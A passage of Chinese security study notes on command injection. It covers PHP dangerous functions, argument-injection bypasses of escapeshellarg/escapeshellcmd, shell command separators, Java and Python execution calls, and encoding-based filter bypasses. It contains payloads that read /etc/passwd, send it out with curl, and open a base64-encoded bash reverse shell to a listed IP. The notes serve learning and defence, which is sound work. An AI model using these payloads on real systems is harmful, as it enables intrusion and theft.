
    [4] => Array
        (
            [5] => cinco
        )

)
```

传入两个及以上的数组时，它们元素数量将会相同。因为回调函数会并行地处理相互对应的元素。 如果几个数组的元素数量不一致：空元素会扩展短那个数组，直到长度和最长的数组一样。

此函数有个有趣的用法：传入 **`null`** 作为回调函数的名称，将创建多维数组（一个数组，内部包含数组。每个数组的元素是回调函数中的参数中多个array的元素）

示例 #4 多个数组的合并操作

```php
<?php
$a = [1, 2, 3, 4, 5];
$b = ['one', 'two', 'three', 'four', 'five'];
$c = ['uno', 'dos', 'tres', 'cuatro', 'cinco'];

$d = array_map(null, $a, $b, $c);
print_r($d);
?>
```

以上例程会输出：

```
Array
(
    [0] => Array
        (
            [0] => 1
            [1] => one
            [2] => uno
        )

    [1] => Array
        (
            [0] => 2
            [1] => two
            [2] => dos
        )

    [2] => Array
        (
            [0] => 3
            [1] => three
            [2] => tres
        )

    [3] => Array
        (
            [0] => 4
            [1] => four
            [2] => cuatro
        )

    [4] => Array
        (
            [0] => 5
            [1] => five
            [2] => cinco
        )

)
```

示例 #5 仅有 `array1` 时，`callback` 设置为 null

```php
<?php
$array = [1, 2, 3];
var_dump(array_map(null, $array));
?>
```

以上例程会输出：

```
array(3) {
  [0]=>  // 表示数组元素[0]存储的是int类型的数据1
  int(1)
  [1]=>
  int(2)
  [2]=>
  int(3)
}
```

示例 #6 array_map()键（key）是 string

当仅仅传入一个数组时，返回的数组会保留传入参数的键（key）。 传入多个数组时，返回的数组键是按顺序的 integer。

```php
<?php
$arr = array("stringkey" => "value");  //表示数组存储的是一个键值对
function cb1($a) {
    return [$a];  //返回一个array
}
function cb2($a, $b) {
    return [$a, $b];
}
var_dump(array_map('cb1', $arr));
var_dump(array_map('cb2', $arr, $arr));
var_dump(array_map(null,  $arr));
var_dump(array_map(null, $arr, $arr));
?>
```

以上例程会输出：

```
array(1) {  //1表示只有一个元素  由于传入的数组只有一个键值对所以只有一个元素
  ["stringkey"]=> //当仅仅传入一个数组时，返回的数组会保留传入参数的键（key）  键对应的值是一个array ，array的元素是键值对对应的值
  array(1) {
    [0]=>
    string(5) "value"
  }
}
array(1) {
  [0]=>   //当传入多个数组时，返回的数组不会保留传入参数的键（key）
  array(2) {
    [0]=>
    string(5) "value"
    [1]=>
    string(5) "value"
  }
}
array(1) {   //回调是null   参数只有一个数组   返回值是数组本身
  ["stringkey"]=>
  string(5) "value"
}
array(1) {  //回调是null,当传入多个数组时，返回的数组不会保留传入参数的键（key）
  [0]=>
  array(2) {
    [0]=>
    string(5) "value"
    [1]=>
    string(5) "value"
  }
}
```

示例 #7*array_map() - 关联数组

虽然 **array_map()** 不能直接支持使用数组的键（key）作为输入，但可以使用 [array_keys()](https://www.php.net/manual/zh/function.array-keys.php) 进行模拟。

```php
<?php
$arr = [
    'v1' => 'First release',
    'v2' => 'Second release',
    'v3' => 'Third release',
];

// 注意： 在 7.4.0 之前，使用较长的语法来代替匿名函数。
$callback = fn(string $k, string $v): string => "$k was the $v";

$result = array_map($callback, array_keys($arr), array_values($arr));

var_dump($result);
?>
```

以上例程会输出：

```
array(3) {
  [0]=>
  string(24) "v1 was the First release"
  [1]=>
  string(25) "v2 was the Second release"
  [2]=>
  string(24) "v3 was the Third release"
}
```

#### eval

(PHP 4, PHP 5, PHP 7, PHP 8)

eval — 把字符串作为PHP代码执行

> 说明

```php
eval(string $code): mixed
```

把字符串code作为PHP代码执行

> 参数



> 返回值



> 范例

#### assert

> 说明



> 参数



> 返回值



> 范例

#### call_user_func

> 说明



> 参数



> 返回值



> 范例



#### preg_replace

> 说明



> 参数



> 返回值



> 范例

#### pcntl_exec

```
void pcntl_exec ( string $path [, array $args [, array $envs ]] )
```

path是可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本
args是一个要传递给程序的参数的字符串数组。

`pcntl`是`linux`下的一个扩展，需要额外安装，可以支持 php 的多线程操作。

```
pcntl_exec 函数的作用是在当前进程空间执行指定程序，版本要求：PHP > 4.2.0
```

防范：

对这些危险函数，可以在php.ini中禁用，进行安全加固

![img](http://cdn.ayusummer233.top/img/c6a1fb425f272cff51a7224007d6cd13.jpg-600)

#### escapeshellarg/escapeshellcmd

> **escapeshellarg:**
> (PHP 4 >= 4.0.3, PHP 5, PHP 7)
> 把字符串转码为可以在 shell 命令里使用的参数  单个参数
> `string escapeshellarg ( string $arg )`
> escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符
>
> 在 Windows 上，**escapeshellarg()** 用空格替换了百分号、感叹号（延迟变量替换）和双引号，并在字符串两边加上双引号。此外，每条连续的反斜线(`\`)都会被一个额外的反斜线所转义。
>
> **概述：**
> 1.确保用户只传递一个参数给命令
> 2.用户不能指定更多的参数
> 3.用户不能执行不同的命令

参数

arg  需要被转码的参数（可能有多个参数）

返回值

转换之后的字符串（一个字符串）

```php
<?php
system('ls '.escapeshellarg($dir));
?>
```



> **escapeshellcmd:**
> (PHP 4, PHP 5, PHP 7)
> shell 元字符转义
> `string escapeshellcmd ( string $command )`
> escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义；
>
> 反斜线（\）会在以下字符之前插入： &#;`|*?~<>^()[]{}$、 \x0A 和 \xFF  以及 ’ 和 " 仅在不配对的时候被转义；在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替
>
> **概述：**
> 1.确保用户只执行一个命令
> 2.用户可以指定不限数量的参数
> 3.用户不能执行不同的命令

command

要转义的命令（可能含有特殊字符）

返回值

转义后的字符串（特殊字符都被转义  前面加上^）

```php
<?php
// 我们故意允许任意数量的参数
$command = './configure '.$_POST['configure_options'];

$escaped_command = escapeshellcmd($command);
 
system($escaped_command);
?>
```

**警告**

**escapeshellcmd()** 应被用在完整的命令字符串上。 即使如此，攻击者还是可以传入任意数量的参数。 请使用 [escapeshellarg()](https://www.php.net/manual/zh/function.escapeshellarg.php) 函数 对单个参数进行转义。

**警告**

**escapeshellcmd()** 不会对空格转义，这在 Windows 上对这样的路径（比如`C:\Program Files\ProgramName\program.exe`）可能会有出现问题。可以使用如下代码暂时解决：

```php
<?php
$cmd = preg_replace('`(?<!^) `', '^ ', escapeshellcmd($cmd));
?>
```

[利用/绕过escapeshellarg/escapeshellcmd函数_H3rmesk1t的博客-CSDN博客_escapeshellarg绕过](https://blog.csdn.net/LYJ20010728/article/details/116902085)

举例：

使用groups打印指定用户所在组的名称（显示linux用户所属的组）

```php
<?php  #需要在linux上运行
    $username = 'hillstone';
    system('groups '.$username);
?>
```

![image-20221009092430478](http://cdn.ayusummer233.top/img/image-20221009092430478.png)



但是攻击者可以在username里使用;或者||
在Linux里，这意味着第二个命令可以在第一个之后被执行

```php
<?php
	$username = 'hillstone;id';
	system('groups '.$username);
?>

=> 
hillstone : hillstone adm cdrom sudo dip plugdev lpadmin lxd sambashare
uid=0(root) gid=0(root) groups=0(root)
```

为了防止这一点，我们使用escapeshellcmd
现在攻击者不能允许第2个命令了

```php
<?php
	$username = 'hillstone;id';
	system(escapeshellcmd('groups '.$username));
?>

=>
groups: "hillstone;id": no such user
```

这是因为php内部运行了下列命令，以至于myuser;id被当成了一个字符串

```
groups "myuser;id"

groups: "myuser;id": no such user
```

但是在这种方法中，攻击者可以指定更多参数groups
例如，一次检测多个用户

```php
<?php
	$username = 'hillstone root';
	system(escapeshellcmd('groups '.$username));
?>

=>
hillstone : hillstone adm cdrom sudo dip plugdev lpadmin lxd sambashare
root : root
```

假设我们希望允许每个脚本执行仅检查一个用户

```php
<?php
	$username = 'hillstone root';
	system('groups '.escapeshellarg($username));
?>

=> 
groups: 'hillstone root': no such user
```

这是因为现在$username被视为单个参数：

$ groups ”myuser1 myuser2“

groups: "myuser1 myuser2": no such user

##### 绕过/利用（参数注入）

escapeshellcmd / escapeshellarg时不可能执行第二个命令

但是仍然可以将参数传递给第一个命令即将新选项传递给命令

利用漏洞的能力取决于目标可执行文件

包含一些可能被滥用的特定选项的一些已知可执行文件的列表

**escapeshellcmd是将传入的字符串特殊字符转义        特殊字符加上\转义(不包含!)  显示的时候不会显示\   字符串被当做一个命令的参数**

**escapeshellarg是将传入的字符串最外面增加一个单引号并且能引用或者转码任何已经存在的单引号，使其称为一个单一的字符串  字符串被当做一个命令的一个参数**

###### TAR

压缩some_file到/tmp/sth

```php
$command = '-cf /tmp/sth /some_file';
system(escapeshellcmd('tar '.$command));
```

特定选项利用：

创建一个空文件/tmp/exploit

```php
$command = "--use-compress-program='touch /tmp/exploit' -cf /tmp/passwd /etc/passwd";
system(escapeshellcmd('tar '.$command));
```

###### FIND

在/Desktop目录下查找1.php

```php
<?php
	$command = '1.php';
	system('find ~/Desktop/ -iname '.escapeshellcmd($command));
?>

=> 
/root/Desktop/1.php
```

特定选项利用：

打印/etc/passwd内容

```php
<?php
	$file = "sth -or -exec cat /etc/passwd ; -quit";#（多个参数）
	system("find /tmp -iname ".escapeshellcmd($file));//亲自尝试报错
?>

=>
root:x:0:0:root:/root:/bin/bash
......
```

###### Escapeshellcmd和escapeshellarg

在这个配置中，我们可以传递第二个参数给函数来绕过escapeshellcmd
列出/tmp目录并忽略sth文件

```php
<?php
	$arg = "sth";
	system(escapeshellcmd("ls --ignore=".escapeshellarg($arg).' /tmp'));
?>
```

特定选项利用：

在/tmp目录中列出文件并忽略sth；使用长列表格式

```php
$arg = "sth' -l ";
// ls --ignore='exploit'\'' -l ' /tmp
system(escapeshellcmd("ls --ignore=".escapeshellarg($arg).' /tmp'));//亲自尝试报错
//system("ls --ignore=^"sth^' -l ^" /tmp")
```

escapeshellcmd绕过是通过命令的特殊选项来绕过

> WGET，下载example.php

```php
$url = 'http://example.com/example.php';
system(escapeshellcmd('wget '.$url));
```

> 保存.php文件到指定目录

```php
$url = '--directory-prefix=/var/www/html http://example.com/example.php';
system(escapeshellcmd('wget '.$url));
```

###### .bat执行命令(windows)

打印somedir中的文件列表

```php
$dir = "somedir";
file_put_contents('out.bat', escapeshellcmd('dir '.$dir));
system('out.bat');
```

特定选项利用：

并且执行whoami命令

```php
$dir = "somedir x1a whoami//  0x1A在ASCII码中代表EOF，在过去，ASCII码EOF曾经在unix/linux中被作为文件结束符使用，微软继承了这个传统，也以EOF作为文件的结束符
file_put_contents('out.bat', escapeshellcmd('dir '.$dir));
system('out.bat');
```

###### SENDMAIL

发送mail.txt到from@sth.com

```php
$from = 'from@sth.com';
system("/usr/sbin/sendmail -t -i -f".escapeshellcmd($from ).' < mail.txt');
```

特定选项利用：

打印/etc/passwd内容

```php
$from = 'from@sth.com -C/etc/passwd -X/tmp/output.txt';
system("/usr/sbin/sendmail -t -i -f".escapeshellcmd($from ).' < mail.txt');
```

###### CURL

下载http://example.com内容

```php
$url = 'http://example.com';
system(escapeshellcmd('curl '.$url));
```

特定选项利用：

发送/etc/passwd内容到http://example.com

```php
$url = '-F password=@/etc/passwd http://example.com';
system(escapeshellcmd('curl '.$url));
```

得到文件内容，使用如下payload

```php
file_put_contents('passwords.txt', file_get_contents($_FILES['password']['tmp_name']));
```

###### MYSQL

执行sql语句

```php
$sql = 'SELECT sth FROM table';
system("mysql -uuser -ppassword -e ".escapeshellarg($sql));
```

特定选项利用：

运行id命令

```php
$sql = 'cat /etc/passwd|grep tmp_name id';
system("mysql -uuser -ppassword -e ".escapeshellarg($sql));
```

###### UNZIP

从archive.zip解压所有*.tmp文件到/tmp目录

```php
$zip_name = 'archive.zip';
system(escapeshellcmd('unzip -j '.$zip_name.' *.tmp -d /tmp'));
```

特定选项利用：

从archive.zip解压所有*.tmp文件到/var/www/html目录

```php
$zip_name = '-d /var/www/html archive.zip';
system('unzip -j '.escapeshellarg($zip_name).' *.tmp -d /tmp');//unzip -j "-d /var/www/html archive.zip" *.tmp -d /tmp
```

###### 未设置LANG[环境变量](https://so.csdn.net/so/search?q=环境变量&spm=1001.2101.3001.7020)，则去除非ASCII字符

```php
$filename = 'résumé.pdf';
// string(10) "'rsum.pdf'"
var_dump(escapeshellarg($filename));
setlocale(LC_CTYPE, 'en_US.utf8');
//string(14) "'résumé.pdf'" 
var_dump(escapeshellarg($filename));
```

##### 经典EXP

> PHP <= 4.3.6 on Windows – CVE-2004-0542

```php
$find = 'word';
system('FIND /C /I '.escapeshellarg($find).' c:\\where\\');

同时运行dir命令

$find = 'word " c:\\where\\ || dir || ';
system('FIND /C /I '.escapeshellarg($find).' c:\where\\');//FIND /C /I "word c:\where\ || dir || " c:\where\
1234567
```

> PHP 4 <= 4.4.8 and PHP 5 <= 5.2.5 – CVE-2008-2051

```php
Shell需要使用GBK，EUC-KR，SJIS等可变宽度字符集的语言环境。

$text = "sth";
system(escapeshellcmd("echo ".$text));
$text = "sth xc0; id";
system(escapeshellcmd("echo ".$text));

或者

$text1 = 'word';
$text2 = 'word2';
system('echo '.escapeshellarg($text1).' '.escapeshellarg($text2));
$text1 = "word xc0";
$text2 = "; id ; #";
system('echo '.escapeshellarg($text1).' '.escapeshellarg($text2));
123456789101112131415
```

> PHP < 5.4.42, 5.5.x before 5.5.26, 5.6.x before 5.6.10 on Windows – CVE-2015-4642

```php
额外传递的第三个参数(—param3)

$a = 'param1_value';
$b = 'param2_value';
system('my_command --param1 ' . escapeshellarg($a) . ' --param2 ' . escapeshellarg($b));

$a = 'a';
$b = 'b -c --param3';
system('my_command --param1 ' . escapeshellarg($a) . ' --param2 ' . escapeshellarg($b));
```

> PHP 7.x before 7.0.2 – CVE-2016-1904

```php
如果将1024mb字符串传递给escapeshellarg,则导致缓冲区溢出escapeshellcmd
```

> PHP 5.4.x < 5.4.43 / 5.5.x < 5.5.27 / 5.6.x < 5.6.11 on Windows

```php
启用EnableDelayedExpansion后，展开一些环境变量。
然后!STH!运行类似于%STH%

escapeshellarg不会过滤!字符
EnableDelayedExpansion以在HKLM或HKCU下的注册表中设置：

[HKEY_CURRENT_USERSoftwareMicrosoftCommand Processor]
"DelayedExpansion"= (REG_DWORD)
1=enabled 0=disabled (default)

例如:

// Leak appdata dir value
$text = '!APPDATA!';
print "echo ".escapeshellarg($text);//echo " APPDATA "
```

> PHP < 5.6.18

```php
功能定义于ext/standard/exec.c，运行类似于(escapeshellcmd，eschapeshellarg，shell_exec)，忽略PHP字符串的长度，并用NULL终止工作代替。

echo escapeshellarg("helloworld");
=>
hello
```

### OS命令执行

部分Web应用程序提供了一些命令执行的操作，例如，测试连通性的女网站测试 http://www.test.com 是否可以正常连接，那么web应用程序底层就很可能去调用系统操作命令，如果此处没有过滤好用户输入的数据，例如管道连接符，就很有可能形成系统命令执行漏洞。

### Windows

有回显时获取信息:

type c:\windows\win.ini

#### 系统支持的命令连接符

> |   直接执行后面的语句

**表示A命令语句的输出，作为B命令语句的输入执行。当A为false的时候将不会执行**

![image-20220926143450343](http://cdn.ayusummer233.top/img/image-20220926143450343.png)

> ||  前面的语句执行出错，则执行后面的语句

**A||B，表示A命令语句执行失败，然后才执行B命令语句。**

![image-20220926143514521](http://cdn.ayusummer233.top/img/image-20220926143514521.png)

![image-20220926143546242](http://cdn.ayusummer233.top/img/image-20220926143546242.png)

> &  前面的语句为假则直接执行后面的语句，前面的语句可真可假  后面的都会执行

**无论左边是false还是true，右边都执行，按顺序执行**

![image-20220926143615429](http://cdn.ayusummer233.top/img/image-20220926143615429.png)

> &&  前面的语句为真中则执行第一个命令后执行第二个命令；为假则直接出错，也不执行后面的语句

**具有短路效果，左边是false，右边不执行**

![image-20220926143647657](http://cdn.ayusummer233.top/img/image-20220926143647657.png)



#### Windows常用变量

```
变量 类型 描述

%ALLUSERSPROFILE% 本地 返回"所有用户"配置文件的位置。

%APPDATA% 　　 本地 返回默认情况下应用程序存储数据的位置。

%CD% 本地 返回当前目录字符串。

%CMDCMDLINE% 本地 返回用来启动当前的 Cmd.exe 的准确命令行。

%CMDEXTVERSION% 系统 返回当前的"命令处理程序扩展"的版本号。

%COMPUTERNAME% 系统 返回计算机的名称。

%COMSPEC% 系统 返回命令行解释器可执行程序的准确路径。

%DATE% 系统 返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。

%ERRORLEVEL% 系统 返回上一条命令的错误代码。通常用非零值表示错误。

%HOMEDRIVE% 系统 返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在"本地用户和组"中指定的。

%HOMEPATH% 系统 返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在"本地用户和组"中指定的。

%HOMESHARE% 系统 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在"本地用户和组"中指定的。

%LOGONSERVER% 本地 返回验证当前登录会话的域控制器的名称。

%NUMBER_OF_PROCESSORS% 系统 指定安装在计算机上的处理器的数目。

%OS% 系统 返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。

%PATH% 系统 指定可执行文件的搜索路径。

%PATHEXT% 系统 返回操作系统认为可执行的文件扩展名的列表。

%PROCESSOR_ARCHITECTURE% 系统 返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。

%PROCESSOR_IDENTFIER% 系统 返回处理器说明。

%PROCESSOR_LEVEL% 系统 返回计算机上安装的处理器的型号。

%PROCESSOR_REVISION% 系统 返回处理器的版本号。

%PROMPT% 本地 返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。

%RANDOM% 系统 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。

%SYSTEMDRIVE% 系统 返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。

%SYSTEMROOT% 系统 返回 Windows server operating system 根目录的位置。

%TEMP%和%TMP% 系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。

%TIME% 系统 返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。

%USERDOMAIN% 本地 返回包含用户帐户的域的名称。

%USERNAME% 本地 返回当前登录的用户的名称。

%USERPROFILE% 本地 返回当前用户的配置文件的位置。

%WINDIR% 系统 返回操作系统目录的位置。
```



### Linux



命令执行可能会检测linux中的特殊命令  如php（这样如果php -r '执行的php命令'  会被检测）

绕过方式：a="ph";b="p";$a$b -r 'echo 123;'  使用linux中的bash语法定义和引用变量从而达到命令执行

有回显时获取信息:

cat /etc/passwd

#### UNIX & Linux 将字符串转换成命令执行

1. Unix & Linux convert string to command
2. UNIX & Linux 将[字符串](https://so.csdn.net/so/search?q=字符串&spm=1001.2101.3001.7020)转换成命令执行
3. Linux sh脚本中怎样将字符串转化为命令

**答案：**

在shell脚本中使用eval命令（此命令是bash的内置命令，凡是bash的内置命令查看帮助时用man eval），而不是exec。

**语法：**

> eval 参数
>
> 参数可以为一组命令的字符串，如“eval yum install dstat–y ”，如果不加参数直接执行eval也可以，返回错误代码依旧为0（成功执行），但没有意义。

**为什么不用exec？**

因为exec在执行一次后自动退出当前shell脚本，导致在exec后的所有行全部忽略。

**为什么exec会自动退出？**

exec不启动新的shell，而是用将后面所跟的命令替换当前的shell（当前运行的脚本或登录会话）的进程。

#### 系统支持的命令连接符

linux变量赋值：

![image-20221009173211871](http://cdn.ayusummer233.top/img/image-20221009173211871.png)

> ；执行完前面的语句执行后面的

**分号（;） 可以进行多条命令的无关联执行，每一条执行结果不会影响其他命令的执行**

![image-20220926144131015](http://cdn.ayusummer233.top/img/image-20220926144131015.png)

> |  显示后面语句的执行结果  前面的语句也会执行，但是没有回显（还有一个作用是前面的输出会作为后面的输入）

但是

echo a b c | read x y z
打印出x,y,z均显示为空。

echo $x $y $z #结果为空
原来在管道的右边会打开一个子进程，所以读到的变量都是子进程中的，父进程中无法显示。（可以在子进程中操作变量）

![image-20221009172318569](http://cdn.ayusummer233.top/img/image-20221009172318569.png)

**解决方法**

1. 使用here string

read x y z <<< $(echo a b c)

2. 先把第一个命令的结果重定向到文件，再从文件中读取。

echo a b c > file
read x y z < file

![image-20220926144157551](http://cdn.ayusummer233.top/img/image-20220926144157551.png)

![image-20220926144734382](http://cdn.ayusummer233.top/img/image-20220926144734382.png)

> || 当前面的语句执行出错，执行后面的语句
>
> **如果 || 左边的命令执行失败(返回1表示失败)，才执行||右边的命令，否则不执行右边的命令，具有短路功能。**

![image-20220926144621131](http://cdn.ayusummer233.top/img/image-20220926144621131.png)

> & 前面的语句为假，则直接执行后面的语句，前面的语句可真可假，后面的语句都会执行
>
> **在后台运行**

![image-20220926145001781](http://cdn.ayusummer233.top/img/image-20220926145001781.png)

> &&  前面的语句为假则直接出错，也不执行后面的语句
>
> **按照顺序执行，如果前面应该正确就会执行下一个，如果错误那么就不会执行下一个**

![image-20220926145051535](http://cdn.ayusummer233.top/img/image-20220926145051535.png)



> ()**如果想执行几个命令，则需要用命令分隔符分号隔开每个命令，并使用圆括号()把所有命令组合起**

![image-20221010093037628](http://cdn.ayusummer233.top/img/image-20221010093037628.png)

### JAVA

Java 体系非常庞大，其中包括：Java SE、Java EE、Java ME。这里都叫JAVA命令执行

> 无论是分支还是框架，都是以Java SE 为基础的
> Java EE 之前被称为J2EE，Java EE 是在Java SE 的基础上构建的，它提供Web服务、组件模型、管理和通信API，可以用来实现企业级的面向服务体系结构（service-oriented architecture，SOA）和Web 2.0应用程序开发
> 在Java SE 中，存在Runtime 类，在该类中提供了exec 方法用以在单独的进程中执行指定的字符串命令，像JSP、Servlet、 Struts、 Spring、 Hibernate 等技术一般执行外部程序都会调用此方法（或者使用ProcessBuilder类，但较少），下面以 Runtime类为例进行说明，模型代码如下:

```java
import java. io.InputStream;  //导包操作
import java. io.InputStreamReader;
import java. io.BufferedReader;
public class RuntimeTest{
  public static void main (String args []) throws Exception{
    if (args.length==0) {
      System.exit(1);  //没有参数就退出
    }
    String command = args[0];
    Runtime run = Runtime.getRuntime();
    Process pro = run. exec(command);  //执行命令
    InputStreamReader in = new InputStreamReader(pro.getInputStream());
    BufferedReader buff = new BufferedReader(in);
    for(String temp = buff.readLine();temp!=null;temp=buff.readLine()){
      System.out.println(temp);  //输出结果
    }
  buff .close();
  in.close();
  }
}
```

![image-20220926155629320](http://cdn.ayusummer233.top/img/image-20220926155629320.png)

先编译为.class文件  再运行.class文件

### Python

代码执行

> exec(string)  #Python 代码的动态执行
>
> eval(string)		*# 返回表达式或代码对象的值*   代码执行器 eval不可以通过变量函数调用
>
> execfile(string)	*# 从一个文件中读取和执行Python脚本*
>
> input(string)		*# Python2.x 中 input() 相等于 eval(raw_input(prompt)) ，用来获取控制台的输入*
>
> compile(string)		*# 将源字符串编译为可执行对象*

命令执行

> system() #执行系统指令
>
> popen() #popen()方法popen()用于从一个命令打开一个管道
>
> subprocess.call *# 执行由参数提供的命令* 
>
> spawn 			*# 执行命令*

Python中subprocess.call使用

这个方法的作用是执行一些命令行的命令，例如 `sh xxx.sh` , `java -jar xxx.jar` 等，会开启一个子进程去执行，并且**等待子进程结束**才继续执行其他的

```python
retcode = subprocess.call(["java", '-jar', jarPath, apkFile, channel, version, targetDstDir])
```

参数是一个元组，元组里不能有空格，每一个命令或者标识单独一个字符串

错误举例：

```python
retcode = subprocess.call([ 'java -jar', jarPath, apkFile, channel, version, targetDstDir])
```

详情见python学习.md

spawn

https://blog.51cto.com/ridingonhorse/1872448

https://blog.csdn.net/succing/article/details/120580232   安装环境

>1. expect是基于tcl演变而来的，所以很多语法和tcl类似，基本的语法如下所示：
>2. 首行加上/usr/bin/expect
>3. spawn: 后面加上需要执行的shell命令，比如说spawn sudo touch testfile
>4. expect: 只有spawn执行的命令结果才会被expect捕捉到，因为spawn会启动一个进程，只有这个进程的相关信息才会被捕捉到，主要包括：标准输入的提示信息，eof和timeout。
>5. send和send_user：send会将expect脚本中需要的信息发送给spawn启动的那个进程，而send_user只是回显用户发出的信息，类似于shell中的echo而已。
-----------------------------------
Linux下

filename: account.sh，可以使用./account.sh newaccout来执行；

```bash
#!/usr/bin/expect

set passwd "mypasswd"[这个是你设置的密码]
set timeout 60

if {$argc != 1} {
    send "usage ./account.sh \$newaccount\n"
    exit
}

set user [lindex $argv [expr $argc-1]]

spawn sudo useradd -s /bin/bash -g mygroup -m $user

expect {
    "assword" {
        send_user "sudo now\n"
        send "$passwd\n"
        exp_continue
    }
    eof
    {
        send_user "eof\n"
    }
}

spawn sudo passwd $user
expect {
    "assword" {
        send "$passwd\n"
        exp_continue
    }
    eof
    {
        send_user "eof"
    }
}

spawn sudo smbpasswd -a $user
expect {
    "assword" {
        send "$passwd\n"
        exp_continue
    }
    eof
    {
        send_user "eof"
    }
}

```



3. 注意点：
第3行： 对变量赋值的方法；
第4行： 默认情况下，timeout是10秒；
第6行： 参数的数目可以用$argc得到；
第11行：参数存在$argv当中，比如取第一个参数就是[lindex $argv 0]；并且如果需要计算的话必须用expr，如计算2-1，则必须用[expr 2-1]；
第13行：用spawn来执行一条shell命令，shell命令根据具体情况可自行调整；有文章说sudo要加-S，经过实际 测试，无需加-S亦可；
第15行：一般情况下，如果连续做两个expect，那么实际上是串行执行的，用例子中的结构则是并行执行的，主要是看匹配到了哪一个；在这个例子中，如果你写成串行的话，即
expect "assword"  用户输入assword会执行此情况下的代码
send "$passwd\n"
expect eof
send_user "eof"
那么第一次将会正确运行，因为第一次sudo时需要密码；但是第二次运行时由于密码已经输过（默认情况下sudo密码再次输入时间为5分钟），则不会提示用户去输入，所以第二个expect将无法匹配到assword，而且必须注意的是如果是spawn命令出现交互式提问的但是expect匹配不上的话，那么程序会按照timeout的设置进行等待；可是如果spawn直接发出了eof也就是本例的情况，那么expect "assword"将不会等待，而直接去执行expect eof。
这时就会报expect: spawn id exp6 not open，因为没有spawn在执行，后面的expect脚本也将会因为这个原因而不再执行；所以对于类似sudo这种命令分支不定的情况，最好是使用并行的方式进行处理；
第17行：仅仅是一个用户提示而已，可以删除；
第18行：向spawn进程发送password；
第19行：使得spawn进程在匹配到一个后再去匹配接下来的交互提示；
第21行：eof是必须去匹配的，在spawn进程结束后会向expect发送eof；如果不去匹配，有时也能运行，比如sleep多少秒后再去spawn下一个命令，但是不要依赖这种行为，很有可能今天还可以，明天就不能用了；

特殊例子：

```
#!/usr/bin/expect
set timeout 30
spawn ssh 10.192.224.224
expect "password:"
send "mypassword\n"
expect "*$"
send "mkdir tmpdir\n"
expect "*$"
```

这个例子实际上是通过ssh去登录远程机器，并且在远程机器上创佳一个目录，我们看到在我们输入密码后并没有去expect eof，这是因为ssh这个spawn并没有结束，而且手动操作时ssh实际上也不会自己结束除非你exit；所以你只能expect bash的提示符，当然也可以是机器名等，这样才可以在远程创建一个目录。

注意，请不要用spawn mkdir tmpdir，这样会使得上一个spawn即ssh结束，那么你的tmpdir将在本机建立。

当然实际情况下可能会要你确认ssh key，可以通过并行的expect进行处理，不多赘述。

-----------------------------------
### 常见过滤绕过

  $0 ： ./test.sh,即命令本身，相当于C/C++中的argv[0]
  $1 ： -f,第一个参数.
  $2 ： config.conf  第二个参数
  $3, $4 ... ：类推。
  $# 参数的个数，不包括命令本身，上例中$#为4.
  $@ ：参数本身的列表，也不包括命令本身，如上例为 -f config.conf -v --prefix=/home
  $* ：和$@相同，但"$*" 和 "$@"(加引号)并不同，"$*"将所有的参数解释成一个字符串，而"$@"是一个参数数组

bash选项

-C    noclobber    防止重定向时覆盖文件(可能会被>|覆盖)
-D   (none)    列出用双引号引用起来的, 以$为前缀的字符串, 但是不执行脚本中的命令
-a    allexport    export(导出)所有定义过的变量
-b    notify    当后台运行的作业终止时, 给出通知(脚本中并不常见)
-c     ...    (none)    从...中读取命令
-e    errexit    当脚本发生第一个错误时, 就退出脚本, 换种说法就是, 当一个命令返回非零值时, 就退出脚本(除了until或while loops, if-tests, list constructs)
-f     noglob    禁用文件名扩展(就是禁用globbing)
-i     interactive    让脚本以交互模式运行
-n    noexec    从脚本中读取命令, 但是不执行它们(做语法检查)
-o   Option-Name    (none)    调用Option-Name选项
-o    posix    POSIX    修改Bash或被调用脚本的行为, 使其符合POSIX标准.
-p    privileged    以"suid"身份来运行脚本(小心!)
-r     restricted    以受限模式来运行脚本(参考 21).
-s    stdin    从stdin中读取命令
-t    (none)    执行完第一个命令之后, 就退出
-u    nounset    如果尝试使用了未定义的变量, 就会输出一个错误消息, 然后强制退出
-v    verbose    在执行每个命令之前, 把每个命令打印到stdout上
-x    xtrace    与-v选项类似, 但是会打印完整命令

`-`    (none)    选项结束标志. 后面的参数为位置参数.
--     (none)    unset(释放)位置参数. 如果指定了参数列表(-- arg1 arg2), 那么位置参数将会依次设置到参数列表中.

man  bash查看

![image-20221010182308709](http://cdn.ayusummer233.top/img/image-20221010182308709.png)

#### 编码绕过

如果命令注入的网站过滤了某些分隔符，可以将分隔符编码后（url编码，base64等）绕过

构造反弹shell的命令

```
bash -i >& /dev/tcp/192.168.1.62/9001 0>&1   #192.168.1.62/9001为反弹的ip和端口
```

bash64编码后为

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNjIvOTAwMSAwPiYx
拼接成bash命令
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNjIvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}'  #从而可以在linux中运行
```

```html
java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNjIvOTAwMSAwPiYx}|{base64,-i}");   #java命令注入
https://bewhale.github.io/tools/encode.html
偶尔有时命令执行有效负载Runtime.getRuntime().exec()失败. 使用 web shells, 反序列化漏洞或其他向量时可能会发生这种情况.
